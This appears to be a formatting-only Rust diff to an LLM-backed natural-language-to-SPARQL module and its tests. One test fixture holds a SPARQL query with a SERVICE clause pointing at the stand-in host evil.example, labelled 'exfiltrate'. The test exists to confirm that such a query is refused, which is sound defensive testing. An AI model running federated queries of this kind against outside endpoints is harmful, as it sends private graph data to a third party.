@@ -182,7 +182,10 @@ pub fn run_nl_query_with(
 
         let (sparql, error): (Option<String>, String) = match sparq_nlq::extract_sparql(&completion)
         {
-            None => (None, "the completion contained no SPARQL code block".to_string()),
+            None => (
+                None,
+                "the completion contained no SPARQL code block".to_string(),
+            ),
             Some(q) => match spargebra::SparqlParser::new().parse_query(&q) {
                 Err(e) => (Some(q), e.to_string()),
                 Ok(parsed) => {
@@ -515,8 +518,12 @@ ex:bob   rdf:type ex:Person ; ex:name "Bob" .
         .expect_err("the executing loop must reject a query it cannot run");
         assert!(ask_err.contains("could not answer"), "{ask_err}");
 
-        let out = run_nl_query(&graph(), "anything", Box::new(FnLlm(move |_| Ok(completion()))))
-            .expect("translation validates syntax only, so it succeeds where `ask` failed");
+        let out = run_nl_query(
+            &graph(),
+            "anything",
+            Box::new(FnLlm(move |_| Ok(completion()))),
+        )
+        .expect("translation validates syntax only, so it succeeds where `ask` failed");
         let v: Value = serde_json::from_str(&out).unwrap();
         assert_eq!(v["sparql"], PARSES_BUT_FAILS);
     }
@@ -526,9 +533,11 @@ ex:bob   rdf:type ex:Person ; ex:name "Bob" .
         // Translation must not become an exfiltration bypass: a SERVICE query the
         // executing loop refuses must not be handed back for the caller to run instead.
         let llm = Box::new(FnLlm(|_| {
-            Ok("```sparql\nSELECT ?s WHERE { SERVICE <http://evil.example/sparql> \
+            Ok(
+                "```sparql\nSELECT ?s WHERE { SERVICE <http://evil.example/sparql> \
                 { ?s ?p ?o } }\n```"
-                .to_string())
+                    .to_string(),
+            )
         }));
         let err = run_nl_query(&graph(), "exfiltrate", llm)
             .expect_err("a SERVICE query must be refused, not returned");
